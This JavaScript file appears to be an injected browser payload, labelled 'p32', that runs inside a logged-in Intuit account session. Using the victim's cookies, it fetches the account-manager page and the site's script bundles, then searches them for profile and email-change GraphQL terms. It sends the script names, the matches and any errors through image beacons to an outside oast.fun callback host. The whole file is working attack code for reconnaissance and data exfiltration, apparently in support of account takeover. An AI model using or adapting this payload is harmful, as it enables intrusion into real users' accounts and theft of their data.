(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var out=[];
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}

log('[*] p32: JS Bundle Scanner for profileId query');
log('');

log('[1] Fetching account manager HTML...');
fetch('/app/account-manager/overview',{credentials:'include'})
.then(function(r){return r.text()})
.then(function(html){
var scripts=[];
var re=/<script[^>]+src="([^"]+)"/gi;
var m;
while((m=re.exec(html))!==null){
scripts.push(m[1]);
}
log('[1] Total script tags: '+scripts.length);

var sameOrigin=[];
for(var i=0;i<scripts.length;i++){
var s=scripts[i];
if(s.indexOf('://')===-1 || s.indexOf('accounts.intuit.com')!==-1 || s.indexOf('.intuit.com')!==-1){
sameOrigin.push(s);
}
}
log('[1] Same-origin/Intuit scripts: '+sameOrigin.length);
for(var j=0;j<sameOrigin.length;j++){
log('  '+j+': '+sameOrigin[j].substring(sameOrigin[j].lastIndexOf('/')+1,sameOrigin[j].lastIndexOf('/')+80));
}
beacon('p32-scripts',sameOrigin.map(function(s){return s.split('/').pop().split('?')[0]}).join(',').substring(0,900));

var terms=['ProfilesConnectionFilterInput','updateEmailAddress','filterBy','profileId','UpdateEmailAddress','getProfile','GetProfile','profiles{','profiles('];
var allMatches=[];
var bn=0;

function scanNext(idx){
if(idx>=sameOrigin.length){
log('');
log('=== SCAN COMPLETE ===');
log('Total matches: '+allMatches.length);
log('');
for(var mi=0;mi<allMatches.length;mi++){
log('[MATCH '+mi+'] '+allMatches[mi].substring(0,300));
}
for(var bi=0;bi<Math.min(allMatches.length,15);bi++){
beacon('p32-m'+bi,allMatches[bi].substring(0,900));
}
beacon('p32-done','matches='+allMatches.length);
return Promise.resolve();
}

var url=sameOrigin[idx];
var fname=url.split('/').pop().split('?')[0];
return fetch(url,{credentials:'include'})
.then(function(r){return r.text()})
.then(function(js){
var found=false;
for(var ti=0;ti<terms.length;ti++){
var term=terms[ti];
var pos=0;
var count=0;
while(count<3){
pos=js.indexOf(term,pos);
if(pos===-1)break;
count++;
found=true;
var start=Math.max(0,pos-200);
var end=Math.min(js.length,pos+300);
var ctx=js.substring(start,end).replace(/[\n\r\t]/g,' ').replace(/\s+/g,' ');
allMatches.push(fname+' | "'+term+'" @'+pos+': ...'+ctx+'...');
pos+=term.length;
}
if(count>0) log('  ['+fname+'] "'+term+'" x'+count);
}
if(!found) log('  ['+fname+'] ('+js.length+' chars, no matches)');
return scanNext(idx+1);
})
.catch(function(e){
log('  ['+fname+'] skip: '+e.message);
return scanNext(idx+1);
});
}

return scanNext(0);
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p32-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p32-crash?e='+encodeURIComponent(e.message);
}
})();
